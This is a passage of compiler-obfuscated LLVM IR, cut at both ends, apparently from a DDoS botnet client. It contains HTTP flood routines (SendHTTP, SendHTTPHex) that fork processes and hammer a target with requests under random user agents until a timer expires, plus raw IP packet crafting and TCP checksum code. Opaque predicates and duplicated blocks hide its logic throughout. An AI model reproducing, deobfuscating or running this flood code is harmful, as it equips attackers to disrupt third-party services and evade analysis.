  store i16 %20, i16* %14, align 2
  %21 = load %struct.iphdr*, %struct.iphdr** %11, align 8
  %22 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %21, i32 0, i32 8
  %23 = load i32, i32* %22, align 4
  %24 = zext i32 %23 to i64
  %25 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %13, i32 0, i32 0
  store i64 %24, i64* %25, align 8
  %26 = load %struct.iphdr*, %struct.iphdr** %11, align 8
  %27 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %26, i32 0, i32 9
  %28 = load i32, i32* %27, align 4
  %29 = zext i32 %28 to i64
  %30 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %13, i32 0, i32 1
  store i64 %29, i64* %30, align 8
  %31 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %13, i32 0, i32 2
  store i8 0, i8* %31, align 8
  %32 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %13, i32 0, i32 3
  store i8 6, i8* %32, align 1
  %33 = call zeroext i16 @htons(i16 zeroext 20) #10
  %34 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %13, i32 0, i32 4
  store i16 %33, i16* %34, align 2
  store i32 44, i32* %15, align 4
  %35 = load i32, i32* %15, align 4
  %36 = sext i32 %35 to i64
  %37 = call noalias i8* @malloc(i64 %36) #3
  %38 = bitcast i8* %37 to i16*
  store i16* %38, i16** %16, align 8
  %39 = load i16*, i16** %16, align 8
  %40 = bitcast i16* %39 to i8*
  %41 = bitcast %struct.tcp_pseudo* %13 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %40, i8* %41, i64 24, i32 1, i1 false)
  %42 = load i16*, i16** %16, align 8
  %43 = bitcast i16* %42 to i8*
  %44 = getelementptr inbounds i8, i8* %43, i64 24
  %45 = load %struct.tcphdr*, %struct.tcphdr** %12, align 8
  %46 = bitcast %struct.tcphdr* %45 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %44, i8* %46, i64 20, i32 1, i1 false)
  %47 = load i16*, i16** %16, align 8
  %48 = load i32, i32* %15, align 4
  %49 = call zeroext i16 @csum(i16* %47, i32 %48)
  store i16 %49, i16* %17, align 2
  %50 = load i16*, i16** %16, align 8
  %51 = bitcast i16* %50 to i8*
  call void @free(i8* %51) #3
  %52 = load i16, i16* %17, align 2
  %53 = load i32, i32* @x.83
  %54 = load i32, i32* @y.84
  %55 = sub i32 %53, 1
  %56 = mul i32 %53, %55
  %57 = urem i32 %56, 2
  %58 = icmp eq i32 %57, 0
  %59 = icmp slt i32 %54, 10
  %60 = or i1 %58, %59
  br i1 %60, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret i16 %52

originalBBalteredBB:                              ; preds = %originalBB, %2
  %61 = alloca %struct.iphdr*, align 8
  %62 = alloca %struct.tcphdr*, align 8
  %63 = alloca %struct.tcp_pseudo, align 8
  %64 = alloca i16, align 2
  %65 = alloca i32, align 4
  %66 = alloca i16*, align 8
  %67 = alloca i16, align 2
  store %struct.iphdr* %0, %struct.iphdr** %61, align 8
  store %struct.tcphdr* %1, %struct.tcphdr** %62, align 8
  %68 = load %struct.iphdr*, %struct.iphdr** %61, align 8
  %69 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %68, i32 0, i32 2
  %70 = load i16, i16* %69, align 2
  store i16 %70, i16* %64, align 2
  %71 = load %struct.iphdr*, %struct.iphdr** %61, align 8
  %72 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %71, i32 0, i32 8
  %73 = load i32, i32* %72, align 4
  %74 = zext i32 %73 to i64
  %75 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %63, i32 0, i32 0
  store i64 %74, i64* %75, align 8
  %76 = load %struct.iphdr*, %struct.iphdr** %61, align 8
  %77 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %76, i32 0, i32 9
  %78 = load i32, i32* %77, align 4
  %79 = zext i32 %78 to i64
  %80 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %63, i32 0, i32 1
  store i64 %79, i64* %80, align 8
  %81 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %63, i32 0, i32 2
  store i8 0, i8* %81, align 8
  %82 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %63, i32 0, i32 3
  store i8 6, i8* %82, align 1
  %83 = call zeroext i16 @htons(i16 zeroext 20) #10
  %84 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %63, i32 0, i32 4
  store i16 %83, i16* %84, align 2
  store i32 44, i32* %65, align 4
  %85 = load i32, i32* %65, align 4
  %86 = sext i32 %85 to i64
  %87 = call noalias i8* @malloc(i64 %86) #3
  %88 = bitcast i8* %87 to i16*
  store i16* %88, i16** %66, align 8
  %89 = load i16*, i16** %66, align 8
  %90 = bitcast i16* %89 to i8*
  %91 = bitcast %struct.tcp_pseudo* %63 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %90, i8* %91, i64 24, i32 1, i1 false)
  %92 = load i16*, i16** %66, align 8
  %93 = bitcast i16* %92 to i8*
  %94 = getelementptr inbounds i8, i8* %93, i64 24
  %95 = load %struct.tcphdr*, %struct.tcphdr** %62, align 8
  %96 = bitcast %struct.tcphdr* %95 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %94, i8* %96, i64 20, i32 1, i1 false)
  %97 = load i16*, i16** %66, align 8
  %98 = load i32, i32* %65, align 4
  %99 = call zeroext i16 @csum(i16* %97, i32 %98)
  store i16 %99, i16* %67, align 2
  %100 = load i16*, i16** %66, align 8
  %101 = bitcast i16* %100 to i8*
  call void @free(i8* %101) #3
  %102 = load i16, i16* %67, align 2
  br label %originalBB
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #4

; Function Attrs: noinline nounwind uwtable
define void @SendHTTP(i8*, i8*, i16 zeroext, i8*, i32, i32) #0 {
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i16, align 2
  %10 = alloca i8*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca [512 x i8], align 16
  %18 = alloca [1 x i8], align 1
  store i8* %0, i8** %7, align 8
  store i8* %1, i8** %8, align 8
  store i16 %2, i16* %9, align 2
  store i8* %3, i8** %10, align 8
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %19 = call i64 @time(i64* null) #3
  %20 = load i32, i32* %11, align 4
  %21 = sext i32 %20 to i64
  %22 = add nsw i64 %19, %21
  %23 = trunc i64 %22 to i32
  store i32 %23, i32* %15, align 4
  store i32 0, i32* %16, align 4
  store i32 0, i32* %14, align 4
  br label %24

; <label>:24:                                     ; preds = %99, %6
  %25 = load i32, i32* %14, align 4
  %26 = load i32, i32* %12, align 4
  %27 = icmp slt i32 %25, %26
  br i1 %27, label %28, label %102

; <label>:28:                                     ; preds = %24
  %29 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %30 = load i8*, i8** %7, align 8
  %31 = load i8*, i8** %10, align 8
  %32 = load i8*, i8** %8, align 8
  %33 = call i32 @rand() #3
  %34 = srem i32 %33, 36
  %35 = sext i32 %34 to i64
  %36 = getelementptr inbounds [59 x i8*], [59 x i8*]* @useragents, i64 0, i64 %35
  %37 = load i8*, i8** %36, align 8
  %38 = call i32 (i8*, i8*, ...) @sprintf(i8* %29, i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.97, i32 0, i32 0), i8* %30, i8* %31, i8* %32, i8* %37) #3
  %39 = call i32 @fork() #3
  %40 = icmp ne i32 %39, 0
  br i1 %40, label %41, label %98

; <label>:41:                                     ; preds = %28
  br label %42

; <label>:42:                                     ; preds = %96, %41
  %43 = load i32, i32* @x.85
  %44 = load i32, i32* @y.86
  %45 = sub i32 %43, 1
  %46 = mul i32 %43, %45
  %47 = urem i32 %46, 2
  %48 = icmp eq i32 %47, 0
  %49 = icmp slt i32 %44, 10
  %50 = or i1 %48, %49
  br i1 %50, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %42
  %51 = load i32, i32* %15, align 4
  %52 = sext i32 %51 to i64
  %53 = call i64 @time(i64* null) #3
  %54 = icmp sgt i64 %52, %53
  %55 = load i32, i32* @x.85
  %56 = load i32, i32* @y.86
  %57 = sub i32 %55, 1
  %58 = mul i32 %55, %57
  %59 = urem i32 %58, 2
  %60 = icmp eq i32 %59, 0
  %61 = icmp slt i32 %56, 10
  %62 = or i1 %60, %61
  br i1 %62, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %54, label %63, label %97

; <label>:63:                                     ; preds = %originalBBpart2
  %64 = load i32, i32* @x.85
  %65 = load i32, i32* @y.86
  %66 = sub i32 %64, 1
  %67 = mul i32 %64, %66
  %68 = urem i32 %67, 2
  %69 = icmp eq i32 %68, 0
  %70 = icmp slt i32 %65, 10
  %71 = or i1 %69, %70
  br i1 %71, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %63
  %72 = load i8*, i8** %8, align 8
  %73 = load i16, i16* %9, align 2
  %74 = call i32 @socket_connect(i8* %72, i16 zeroext %73)
  store i32 %74, i32* %13, align 4
  %75 = load i32, i32* %13, align 4
  %76 = icmp ne i32 %75, 0
  %77 = load i32, i32* @x.85
  %78 = load i32, i32* @y.86
  %79 = sub i32 %77, 1
  %80 = mul i32 %77, %79
  %81 = urem i32 %80, 2
  %82 = icmp eq i32 %81, 0
  %83 = icmp slt i32 %78, 10
  %84 = or i1 %82, %83
  br i1 %84, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %76, label %85, label %96

; <label>:85:                                     ; preds = %originalBBpart24
  %86 = load i32, i32* %13, align 4
  %87 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %88 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %89 = call i64 @strlen(i8* %88) #9
  %90 = call i64 @write(i32 %86, i8* %87, i64 %89)
  %91 = load i32, i32* %13, align 4
  %92 = getelementptr inbounds [1 x i8], [1 x i8]* %18, i32 0, i32 0
  %93 = call i64 @read(i32 %91, i8* %92, i64 1)
  %94 = load i32, i32* %13, align 4
  %95 = call i32 @close(i32 %94)
  br label %96

; <label>:96:                                     ; preds = %85, %originalBBpart24
  br label %42

; <label>:97:                                     ; preds = %originalBBpart2
  call void @exit(i32 0) #11
  unreachable

; <label>:98:                                     ; preds = %28
  br label %99

; <label>:99:                                     ; preds = %98
  %100 = load i32, i32* %14, align 4
  %101 = add nsw i32 %100, 1
  store i32 %101, i32* %14, align 4
  br label %24

; <label>:102:                                    ; preds = %24
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %42
  %103 = load i32, i32* %15, align 4
  %104 = sext i32 %103 to i64
  %105 = call i64 @time(i64* null) #3
  %106 = icmp sgt i64 %104, %105
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %63
  %107 = load i8*, i8** %8, align 8
  %108 = load i16, i16* %9, align 2
  %109 = call i32 @socket_connect(i8* %107, i16 zeroext %108)
  store i32 %109, i32* %13, align 4
  %110 = load i32, i32* %13, align 4
  %111 = icmp ne i32 %110, 0
  br label %originalBB1
}

; Function Attrs: nounwind
declare i32 @sprintf(i8*, i8*, ...) #1

; Function Attrs: noreturn nounwind
declare void @exit(i32) #7

; Function Attrs: noinline nounwind uwtable
define void @SendHTTPHex(i8*, i8*, i16 zeroext, i8*, i32, i32) #0 {
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i16, align 2
  %10 = alloca i8*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca [512 x i8], align 16
  %18 = alloca [1 x i8], align 1
  %19 = alloca [2048 x i8], align 16
  store i8* %0, i8** %7, align 8
  store i8* %1, i8** %8, align 8
  store i16 %2, i16* %9, align 2
  store i8* %3, i8** %10, align 8
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %20 = call i64 @time(i64* null) #3
  %21 = load i32, i32* %11, align 4
  %22 = sext i32 %21 to i64
  %23 = add nsw i64 %20, %22
  %24 = trunc i64 %23 to i32
  store i32 %24, i32* %15, align 4
  store i32 0, i32* %16, align 4
  %25 = getelementptr inbounds [2048 x i8], [2048 x i8]* %19, i32 0, i32 0
  %26 = call i32 (i8*, i8*, ...) @sprintf(i8* %25, i8* getelementptr inbounds ([265 x i8], [265 x i8]* @.str.98, i32 0, i32 0)) #3
  store i32 0, i32* %14, align 4
  br label %27

; <label>:27:                                     ; preds = %134, %6
  %28 = load i32, i32* @x.87
  %29 = load i32, i32* @y.88
  %30 = sub i32 %28, 1
  %31 = mul i32 %28, %30
  %32 = urem i32 %31, 2
  %33 = icmp eq i32 %32, 0
  %34 = icmp slt i32 %29, 10
  %35 = or i1 %33, %34
  br i1 %35, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %27
  %36 = load i32, i32* %14, align 4
  %37 = load i32, i32* %12, align 4
  %38 = icmp slt i32 %36, %37
  %39 = load i32, i32* @x.87
  %40 = load i32, i32* @y.88
  %41 = sub i32 %39, 1
  %42 = mul i32 %39, %41
  %43 = urem i32 %42, 2
  %44 = icmp eq i32 %43, 0
  %45 = icmp slt i32 %40, 10
  %46 = or i1 %44, %45
  br i1 %46, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %38, label %47, label %137

; <label>:47:                                     ; preds = %originalBBpart2
  %48 = load i32, i32* @x.87
  %49 = load i32, i32* @y.88
  %50 = sub i32 %48, 1
  %51 = mul i32 %48, %50
  %52 = urem i32 %51, 2
  %53 = icmp eq i32 %52, 0
  %54 = icmp slt i32 %49, 10
  %55 = or i1 %53, %54
  br i1 %55, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %47
  %56 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %57 = load i8*, i8** %7, align 8
  %58 = getelementptr inbounds [2048 x i8], [2048 x i8]* %19, i32 0, i32 0
  %59 = load i8*, i8** %8, align 8
  %60 = call i32 @rand() #3
  %61 = srem i32 %60, 36
  %62 = sext i32 %61 to i64
  %63 = getelementptr inbounds [59 x i8*], [59 x i8*]* @useragents, i64 0, i64 %62
  %64 = load i8*, i8** %63, align 8
  %65 = call i32 (i8*, i8*, ...) @sprintf(i8* %56, i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.97, i32 0, i32 0), i8* %57, i8* %58, i8* %59, i8* %64) #3
  %66 = call i32 @fork() #3
  %67 = icmp ne i32 %66, 0
  %68 = load i32, i32* @x.87
  %69 = load i32, i32* @y.88
  %70 = sub i32 %68, 1
  %71 = mul i32 %68, %70
  %72 = urem i32 %71, 2
  %73 = icmp eq i32 %72, 0
  %74 = icmp slt i32 %69, 10
  %75 = or i1 %73, %74
  br i1 %75, label %originalBBpart212, label %originalBB1alteredBB

originalBBpart212:                                ; preds = %originalBB1
  br i1 %67, label %76, label %133

; <label>:76:                                     ; preds = %originalBBpart212
  br label %77

; <label>:77:                                     ; preds = %originalBBpart220, %76
  %78 = load i32, i32* %15, align 4
  %79 = sext i32 %78 to i64
  %80 = call i64 @time(i64* null) #3
  %81 = icmp sgt i64 %79, %80
  br i1 %81, label %82, label %132

; <label>:82:                                     ; preds = %77
  %83 = load i8*, i8** %8, align 8
  %84 = load i16, i16* %9, align 2
  %85 = call i32 @socket_connect(i8* %83, i16 zeroext %84)
  store i32 %85, i32* %13, align 4
  %86 = load i32, i32* %13, align 4
  %87 = icmp ne i32 %86, 0
  br i1 %87, label %88, label %115

; <label>:88:                                     ; preds = %82
  %89 = load i32, i32* @x.87
  %90 = load i32, i32* @y.88
  %91 = sub i32 %89, 1
  %92 = mul i32 %89, %91
  %93 = urem i32 %92, 2
  %94 = icmp eq i32 %93, 0
  %95 = icmp slt i32 %90, 10
  %96 = or i1 %94, %95
  br i1 %96, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %88
  %97 = load i32, i32* %13, align 4
  %98 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %99 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %100 = call i64 @strlen(i8* %99) #9
  %101 = call i64 @write(i32 %97, i8* %98, i64 %100)
  %102 = load i32, i32* %13, align 4
  %103 = getelementptr inbounds [1 x i8], [1 x i8]* %18, i32 0, i32 0
  %104 = call i64 @read(i32 %102, i8* %103, i64 1)
  %105 = load i32, i32* %13, align 4
  %106 = call i32 @close(i32 %105)
  %107 = load i32, i32* @x.87
  %108 = load i32, i32* @y.88
  %109 = sub i32 %107, 1
  %110 = mul i32 %107, %109
  %111 = urem i32 %110, 2
  %112 = icmp eq i32 %111, 0
  %113 = icmp slt i32 %108, 10
  %114 = or i1 %112, %113
  br i1 %114, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %115

; <label>:115:                                    ; preds = %originalBBpart216, %82
  %116 = load i32, i32* @x.87
  %117 = load i32, i32* @y.88
  %118 = sub i32 %116, 1
  %119 = mul i32 %116, %118
  %120 = urem i32 %119, 2
  %121 = icmp eq i32 %120, 0
  %122 = icmp slt i32 %117, 10
  %123 = or i1 %121, %122
  br i1 %123, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %115
  %124 = load i32, i32* @x.87
  %125 = load i32, i32* @y.88
  %126 = sub i32 %124, 1
  %127 = mul i32 %124, %126
  %128 = urem i32 %127, 2
  %129 = icmp eq i32 %128, 0
  %130 = icmp slt i32 %125, 10
  %131 = or i1 %129, %130
  br i1 %131, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br label %77

; <label>:132:                                    ; preds = %77
  call void @exit(i32 0) #11
  unreachable

; <label>:133:                                    ; preds = %originalBBpart212
  br label %134

; <label>:134:                                    ; preds = %133
  %135 = load i32, i32* %14, align 4
  %136 = add nsw i32 %135, 1
  store i32 %136, i32* %14, align 4
  br label %27

; <label>:137:                                    ; preds = %originalBBpart2
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %27
  %138 = load i32, i32* %14, align 4
  %139 = load i32, i32* %12, align 4
  %140 = icmp slt i32 %138, %139
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %47
  %141 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %142 = load i8*, i8** %7, align 8
  %143 = getelementptr inbounds [2048 x i8], [2048 x i8]* %19, i32 0, i32 0
  %144 = load i8*, i8** %8, align 8
  %145 = call i32 @rand() #3
  %_ = sub i32 0, %145
  %gen = add i32 %_, 36
  %_2 = sub i32 0, %145
  %gen3 = add i32 %_2, 36
  %_4 = sub i32 %145, 36
  %gen5 = mul i32 %_4, 36
  %_6 = shl i32 %145, 36
  %_7 = shl i32 %145, 36
  %_8 = shl i32 %145, 36
  %_9 = sub i32 0, %145
  %gen10 = add i32 %_9, 36
  %146 = srem i32 %145, 36
  %147 = sext i32 %146 to i64
  %148 = getelementptr inbounds [59 x i8*], [59 x i8*]* @useragents, i64 0, i64 %147
  %149 = load i8*, i8** %148, align 8
  %150 = call i32 (i8*, i8*, ...) @sprintf(i8* %141, i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.97, i32 0, i32 0), i8* %142, i8* %143, i8* %144, i8* %149) #3
  %151 = call i32 @fork() #3
  %152 = icmp ne i32 %151, 0
  br label %originalBB1

originalBB14alteredBB:                            ; preds = %originalBB14, %88
  %153 = load i32, i32* %13, align 4
  %154 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %155 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %156 = call i64 @strlen(i8* %155) #9
  %157 = call i64 @write(i32 %153, i8* %154, i64 %156)
  %158 = load i32, i32* %13, align 4
  %159 = getelementptr inbounds [1 x i8], [1 x i8]* %18, i32 0, i32 0
  %160 = call i64 @read(i32 %158, i8* %159, i64 1)
  %161 = load i32, i32* %13, align 4
  %162 = call i32 @close(i32 %161)
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %115
  br label %originalBB18
}

; Function Attrs: noinline nounwind uwtable
define void @makeIPPacket(%struct.iphdr*, i32, i32, i8 zeroext, i32) #0 {
  %6 = load i32, i32* @x.89
  %7 = load i32, i32* @y.90
  %8 = sub i32 %6, 1
  %9 = mul i32 %6, %8
  %10 = urem i32 %9, 2
  %11 = icmp eq i32 %10, 0
  %12 = icmp slt i32 %7, 10
  %13 = or i1 %11, %12
  br i1 %13, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %5
  %14 = alloca %struct.iphdr*, align 8
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i8, align 1
  %18 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %14, align 8
  store i32 %1, i32* %15, align 4
  store i32 %2, i32* %16, align 4
  store i8 %3, i8* %17, align 1
  store i32 %4, i32* %18, align 4
  %19 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %20 = bitcast %struct.iphdr* %19 to i8*
  %21 = load i8, i8* %20, align 4
  %22 = and i8 %21, -16
  %23 = or i8 %22, 5
  store i8 %23, i8* %20, align 4
  %24 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %25 = bitcast %struct.iphdr* %24 to i8*
  %26 = load i8, i8* %25, align 4
  %27 = and i8 %26, 15
  %28 = or i8 %27, 64
  store i8 %28, i8* %25, align 4
  %29 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %30 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %29, i32 0, i32 1
  store i8 0, i8* %30, align 1
  %31 = load i32, i32* %18, align 4
  %32 = sext i32 %31 to i64
  %33 = add i64 20, %32
  %34 = trunc i64 %33 to i16
  %35 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %36 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %35, i32 0, i32 2
  store i16 %34, i16* %36, align 2
  %37 = call i32 @rand_cmwc()
  %38 = trunc i32 %37 to i16
  %39 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %40 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %39, i32 0, i32 3
  store i16 %38, i16* %40, align 4
  %41 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %42 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %41, i32 0, i32 4
  store i16 0, i16* %42, align 2
  %43 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %44 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %43, i32 0, i32 5
  store i8 -1, i8* %44, align 4
  %45 = load i8, i8* %17, align 1
  %46 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %47 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %46, i32 0, i32 6
  store i8 %45, i8* %47, align 1
  %48 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %49 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %48, i32 0, i32 7
  store i16 0, i16* %49, align 2
  %50 = load i32, i32* %16, align 4
  %51 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %52 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %51, i32 0, i32 8
  store i32 %50, i32* %52, align 4
  %53 = load i32, i32* %15, align 4
  %54 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %55 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %54, i32 0, i32 9
  store i32 %53, i32* %55, align 4
  %56 = load i32, i32* @x.89
  %57 = load i32, i32* @y.90
  %58 = sub i32 %56, 1
  %59 = mul i32 %56, %58
  %60 = urem i32 %59, 2
  %61 = icmp eq i32 %60, 0
  %62 = icmp slt i32 %57, 10
  %63 = or i1 %61, %62
  br i1 %63, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %5
  %64 = alloca %struct.iphdr*, align 8
  %65 = alloca i32, align 4
  %66 = alloca i32, align 4
  %67 = alloca i8, align 1
  %68 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %64, align 8
  store i32 %1, i32* %65, align 4
  store i32 %2, i32* %66, align 4
  store i8 %3, i8* %67, align 1
  store i32 %4, i32* %68, align 4
  %69 = load %struct.iphdr*, %struct.iphdr** %64, align 8
  %70 = bitcast %struct.iphdr* %69 to i8*
  %71 = load i8, i8* %70, align 4
  %_ = sub i8 0, %71
  %gen = add i8 %_, -16
  %72 = and i8 %71, -16
  %_1 = sub i8 %72, 5
  %gen2 = mul i8 %_1, 5
  %_3 = sub i8 0, %72
  %gen4 = add i8 %_3, 5
  %_5 = shl i8 %72, 5
  %_6 = sub i8 0, %72
  %gen7 = add i8 %_6, 5
  %_8 = shl i8 %72, 5
  %_9 = sub i8 %72, 5
  %gen10 = mul i8 %_9, 5
  %_11 = sub i8 %72, 5
  %gen12 = mul i8 %_11, 5
  %73 = or i8 %72, 5
  store i8 %73, i8* %70, align 4
  %74 = load %struct.iphdr*, %struct.iphdr** %64, align 8
  %75 = bitcast %struct.iphdr* %74 to i8*
  %76 = load i8, i8* %75, align 4
  %_13 = shl i8 %76, 15
  %77 = and i8 %76, 15
  %_14 = shl i8 %77, 64
  %_15 = sub i8 %77, 64
  %gen16 = mul i8 %_15, 64
  %_17 = sub i8 0, %77
  %gen18 = add i8 %_17, 64
  %_19 = sub i8 0, %77
  %gen20 = add i8 %_19, 64
  %_21 = sub i8 %77, 64
  %gen22 = mul i8 %_21, 64
  %_23 = shl i8 %77, 64
  %_24 = sub i8 %77, 64
  %gen25 = mul i8 %_24, 64
  %78 = or i8 %77, 64
  store i8 %78, i8* %75, align 4
  %79 = load %struct.iphdr*, %struct.iphdr** %64, align 8
  %80 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %79, i32 0, i32 1
  store i8 0, i8* %80, align 1
  %81 = load i32, i32* %68, align 4
  %82 = sext i32 %81 to i64
  %_26 = shl i64 20, %82
  %83 = add i64 20, %82
  %84 = trunc i64 %83 to i16
  %85 = load %struct.iphdr*, %struct.iphdr** %64, align 8
  %86 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %85, i32 0, i32 2
  store i16 %84, i16* %86, align 2
  %87 = call i32 @rand_cmwc()
  %88 = trunc i32 %87 to i16
  %89 = load %struct.iphdr*, %struct.iphdr** %64, align 8
  %90 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %89, i32 0, i32 3
  store i16 %88, i16* %90, align 4
  %91 = load %struct.iphdr*, %struct.iphdr** %64, align 8
  %92 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %91, i32 0, i32 4
  store i16 0, i16* %92, align 2
  %93 = load %struct.iphdr*, %struct.iphdr** %64, align 8
  %94 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %93, i32 0, i32 5
  store i8 -1, i8* %94, align 4
  %95 = load i8, i8* %67, align 1
  %96 = load %struct.iphdr*, %struct.iphdr** %64, align 8
  %97 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %96, i32 0, i32 6
  store i8 %95, i8* %97, align 1
  %98 = load %struct.iphdr*, %struct.iphdr** %64, align 8
  %99 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %98, i32 0, i32 7
  store i16 0, i16* %99, align 2
  %100 = load i32, i32* %66, align 4
  %101 = load %struct.iphdr*, %struct.iphdr** %64, align 8
  %102 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %101, i32 0, i32 8
  store i32 %100, i32* %102, align 4
  %103 = load i32, i32* %65, align 4
  %104 = load %struct.iphdr*, %struct.iphdr** %64, align 8
  %105 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %104, i32 0, i32 9
  store i32 %103, i32* %105, align 4
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define i32 @sclose(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %4 = load i32, i32* %3, align 4
  %5 = icmp sgt i32 3, %4
  br i1 %5, label %6, label %23

; <label>:6:                                      ; preds = %1
  %7 = load i32, i32* @x.91
  %8 = load i32, i32* @y.92
  %9 = sub i32 %7, 1
  %10 = mul i32 %7, %9
  %11 = urem i32 %10, 2
  %12 = icmp eq i32 %11, 0
  %13 = icmp slt i32 %8, 10
  %14 = or i1 %12, %13
  br i1 %14, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %6
  store i32 1, i32* %2, align 4
  %15 = load i32, i32* @x.91
  %16 = load i32, i32* @y.92
  %17 = sub i32 %15, 1
  %18 = mul i32 %15, %17
  %19 = urem i32 %18, 2
  %20 = icmp eq i32 %19, 0
  %21 = icmp slt i32 %16, 10
  %22 = or i1 %20, %21
  br i1 %22, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %26

; <label>:23:                                     ; preds = %1
  %24 = load i32, i32* %3, align 4
